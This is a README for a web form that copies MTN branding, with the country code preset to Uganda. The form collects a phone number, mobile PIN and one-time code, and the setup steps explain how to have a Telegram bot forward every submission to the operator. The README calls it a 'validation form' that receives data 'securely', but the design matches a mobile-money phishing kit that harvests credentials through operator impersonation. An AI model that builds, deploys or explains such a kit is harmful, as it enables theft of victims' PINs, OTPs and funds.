# MTN Details Validation Form

A clean, responsive web form designed for capturing user details (Phone Number, PIN) and verifying them with an OTP. The form is styled with official MTN branding (Yellow and Blue) and integrates a Telegram Bot backend to securely receive the submitted data.

## Features
* **MTN Branding**: Authentic color palette and clean UI design.
* **Auto-Advancing Inputs**: The 5-digit PIN boxes and 4-digit OTP boxes automatically shift focus to the next box as you type for a seamless user experience.
* **Phone Number Formatting**: The phone number field automatically spaces the digits for better readability.
* **Country Code Default**: Preset to `+256` (Uganda).
* **Telegram Backend Integration**: Form submissions are automatically sent to your personal Telegram account using a Telegram Bot.

## Files Included
* `index.html` - The main structure of the form (Details Page & OTP Page).
* `style.css` - All the styling and animations.
* `script.js` - The logic for form behavior, input auto-focusing, and Telegram API requests.

## Setup Instructions

To receive the submitted form details directly to your Telegram app, you need to configure the `script.js` file with your Telegram Bot credentials.

### 1. Create a Telegram Bot
1. Open Telegram and search for `@BotFather`.
2. Send the command `/newbot` and follow the instructions to create a new bot.
3. Once created, BotFather will give you a **Bot Token** (it looks something like `123456789:ABCdefGHIjklMNOpqrSTUvwxYZ`). Copy this token.

### 2. Get Your Chat ID
1. Search for `@userinfobot` or `@getmyid_bot` on Telegram and click Start.
2. It will reply with your personal **Chat ID** (a series of numbers like `987654321`). Copy this ID.

### 3. Add Credentials to the Code
Open the `script.js` file in a text editor (like Notepad, VS Code, etc.). At the very top of the file, you will see this configuration section:

```javascript
// Telegram Configuration - REPLACE THESE WITH YOUR ACTUAL DETAILS
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
```

* Replace `'YOUR_BOT_TOKEN_HERE'` with the Bot Token you copied.
* Replace `'YOUR_CHAT_ID_HERE'` with your Chat ID.

*(Make sure to keep the single quotes `'` around your token and ID!)*

### 4. Run the Form
Simply double-click the `index.html` file to open it in your browser. Whenever someone enters their details and clicks "Validate", you will instantly receive a message in Telegram from your bot.

## Testing Locally
If you do not set up the Telegram credentials immediately, the form will still function visually by simulating a successful loading state so you can test the UI without errors.
